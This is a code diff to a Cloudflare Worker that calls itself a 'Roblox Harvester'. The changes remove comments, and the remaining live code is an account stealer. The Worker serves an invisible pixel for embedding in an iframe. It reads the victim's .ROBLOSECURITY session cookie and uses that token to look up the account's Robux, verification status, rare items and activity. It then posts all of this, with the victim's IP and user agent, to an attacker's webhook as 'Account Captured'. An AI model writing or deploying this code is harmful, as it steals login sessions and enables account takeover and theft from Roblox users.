@@ -1,14 +1,8 @@
-// === CONFIGURATION ===
-// Set WEBHOOK_URL in Cloudflare Worker environment variables (secrets)
-
 export default {
   async fetch(request, env, ctx) {
     const url = new URL(request.url);
     
-    // === OPTION 1: Serve a tiny invisible pixel (for the iframe) ===
     if (url.pathname === '/pixel' || url.pathname === '/') {
-      // Return a 1x1 transparent GIF pixel
-      // This is what the iframe will load — just a tiny invisible image
       const pixel = 'R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7';
       const decoded = Uint8Array.from(atob(pixel), c => c.charCodeAt(0));
       
@@ -21,7 +15,6 @@ export default {
       });
     }
     
-    // === OPTION 2: Direct check endpoint — captures cookie and fetches data ===
     if (url.pathname === '/check') {
       const cookieHeader = request.headers.get("Cookie") || "";
       const robloxMatch = cookieHeader.match(/(?:^|;\s*)\.ROBLOSECURITY=([^;]+)/);
@@ -29,14 +22,11 @@ export default {
       if (robloxMatch && robloxMatch[1] && robloxMatch[1].length > 10) {
         const token = robloxMatch[1];
         
-        // Fire webhook with account data
         ctx.waitUntil(
           (async () => {
             try {
               await processToken(token, request, env);
-            } catch (e) {
-              // Silent fail
-            }
+            } catch (e) {}
           })()
         );
         
@@ -56,7 +46,6 @@ export default {
       });
     }
     
-    // === OPTION 3: Redirect to Roblox (for testing) ===
     return new Response('Roblox Harvester — Use /check or /pixel', {
       status: 200,
       headers: {
@@ -67,12 +56,10 @@ export default {
   }
 };
 
-// === PROCESS TOKEN — FULL ACCOUNT SCAN ===
 async function processToken(token, request, env) {
   const ip = request.headers.get("CF-Connecting-IP") || "unknown";
   const ua = request.headers.get("User-Agent") || "unknown";
   
-  // === VALIDATE TOKEN & GET USER INFO ===
   const userInfo = await fetch("https://www.roblox.com/mobileapi/userinfo", {
     headers: { "Cookie": `.ROBLOSECURITY=${token}` }
   });
@@ -103,7 +90,6 @@ async function processToken(token, request, env) {
   const createdDate = userData.Created || "Unknown";
   const accountAge = calculateAge(createdDate);
 
-  // === FETCH FOLLOWER COUNT ===
   let followers = 0;
   try {
     const profileRes = await fetch(`https://www.roblox.com/users/${userId}/profile`);
@@ -112,12 +98,10 @@ async function processToken(token, request, env) {
     if (followerMatch) followers = parseInt(followerMatch[1]) || 0;
   } catch (_) {}
 
-  // === CHECK FOR KORBLOX + HEADLESS ===
   let hasKorblox = false;
   let hasHeadless = false;
 
   try {
-    // Korblox = Item ID 1027821
     const inventoryRes = await fetch(
       `https://inventory.roblox.com/v1/users/${userId}/items/Collectible/1027821?limit=1`,
       { headers: { "Cookie": `.ROBLOSECURITY=${token}` } }
@@ -127,7 +111,6 @@ async function processToken(token, request, env) {
       hasKorblox = invData.data && invData.data.length > 0;
     }
 
-    // Headless = Item ID 1366566
     const headlessRes = await fetch(
       `https://inventory.roblox.com/v1/users/${userId}/items/Collectible/1366566?limit=1`,
       { headers: { "Cookie": `.ROBLOSECURITY=${token}` } }
@@ -138,10 +121,8 @@ async function processToken(token, request, env) {
     }
   } catch (_) {}
 
-  // === YEAR SUMMARY ===
   const summary = await getYearSummary(userId, token);
 
-  // === BUILD VERIFICATION & ASSET STRINGS ===
   const verificationStatus = [];
   if (verifiedEmail) verificationStatus.push("✅ Email");
   if (verifiedPhone) verificationStatus.push("✅ Phone");
@@ -151,7 +132,6 @@ async function processToken(token, request, env) {
   if (hasKorblox) assetList.push("💀 Korblox");
   if (hasHeadless) assetList.push("🎃 Headless");
 
-  // === BUILD EMBED ===
   const embed = {
     title: `🎯 Account Harvest — @${username}`,
     color: 0x00ff88,
@@ -162,11 +142,9 @@ async function processToken(token, request, env) {
       { name: "🆔 User ID", value: `\`${userId}\``, inline: true },
       { name: "📅 Account Age", value: accountAge, inline: true },
       { name: "💰 Robux", value: `**${robux.toLocaleString()}** R$`, inline: true },
-
       { name: "✅ Verification", value: verificationStatus.length > 0 ? verificationStatus.join(" · ") : "❌ None", inline: true },
       { name: "👥 Followers", value: followers.toLocaleString(), inline: true },
       { name: "👑 Rare Items", value: assetList.length > 0 ? assetList.join(" · ") : "None", inline: true },
-
       { name: "📊 1-Year Summary", value: summary || "No recent activity", inline: false },
       { name: "🌐 IP", value: ip, inline: true },
       { name: "🖥️ UA", value: ua.substring(0, 60), inline: true }
@@ -178,7 +156,6 @@ async function processToken(token, request, env) {
     timestamp: new Date().toISOString()
   };
 
-  // === SEND SPLIT PAYLOAD ===
   await sendWebhook(env.WEBHOOK_URL, {
     content: `@everyone 🔔 **Account Captured** | @${username} | ${robux.toLocaleString()} R$`,
     embeds: [embed]
@@ -189,7 +166,6 @@ async function processToken(token, request, env) {
   });
 }
 
-// === HELPERS ===
 function calculateAge(createdDate) {
   if (!createdDate || createdDate === "Unknown") return "Unknown";
   try {
